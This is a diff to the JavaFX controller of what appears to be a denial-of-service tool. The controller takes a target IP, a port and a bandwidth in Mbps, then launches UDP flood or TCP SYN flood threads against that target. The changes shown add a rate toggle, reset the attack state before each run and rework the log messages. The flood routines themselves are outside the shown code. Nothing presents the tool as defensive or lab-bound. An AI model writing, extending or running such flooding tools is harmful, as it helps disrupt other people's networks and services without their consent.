@@ -13,6 +13,8 @@ import javafx.scene.control.TextArea;
 import javafx.application.Platform;
 import java.net.InetSocketAddress;
 import java.io.IOException;
+import javafx.scene.control.ToggleButton;
+import javafx.scene.layout.HBox;
 
 public class MainController {
     private Jenkins jenkinsTool;
@@ -30,6 +32,9 @@ public class MainController {
     @FXML private TextArea logArea;
     @FXML private Button findOpenPortButton;
 
+    @FXML private HBox rateBox;
+    private boolean isMbps = true;
+
     @FXML
     public void initialize() {
         jenkinsTool = new Jenkins();
@@ -39,6 +44,8 @@ public class MainController {
         
         startButton.setOnAction(e -> startAttack());
         stopButton.setOnAction(e -> stopAttack());
+        
+
     }
 
     @FXML
@@ -84,12 +91,15 @@ public class MainController {
     }
 
     public void startAttack() {
+        jenkinsTool.resetAttack();  // Add this line
         String attackType = attackTypeComboBox.getValue();
         String targetIp = ipAddressField.getText();
-        int mbps = Integer.parseInt(mbpsField.getText());
-        int bytesPerSecond = mbps * 125000; // Convert Mbps to bytes per second
+        int rate = Integer.parseInt(mbpsField.getText());
+        int bytesPerSecond = rate * 125000; // Convert Mbps to bytes per second
 
-        log("Starting attack with type: " + attackType + ", targetIp: " + targetIp + ", mbps: " + mbps + ", bytesPerSecond: " + bytesPerSecond);
+        log("Starting attack with type: " + attackType + ", targetIp: " + targetIp + 
+            ", rate: " + rate + " Mbps" + 
+            ", bytesPerSecond: " + bytesPerSecond);
 
         statusLabel.setText("Status: Attack in Progress");
         statusLabel.setStyle("-fx-text-fill: #2e7d32;");
@@ -103,8 +113,8 @@ public class MainController {
                 log("UDP flood thread ended");
             }).start();
         } else if ("TCP SYN Flood".equals(attackType)) {
-            int targetPort = Integer.parseInt(portField.getText());
             log("Starting TCP SYN flood attack...");
+            int targetPort = Integer.parseInt(portField.getText());
             new Thread(() -> {
                 log("TCP SYN flood thread started");
                 jenkinsTool.tcpSynFlood(targetIp, targetPort, bytesPerSecond);
@@ -156,4 +166,5 @@ public class MainController {
             logArea.setScrollTop(Double.MAX_VALUE);
         });
     }
+
 }
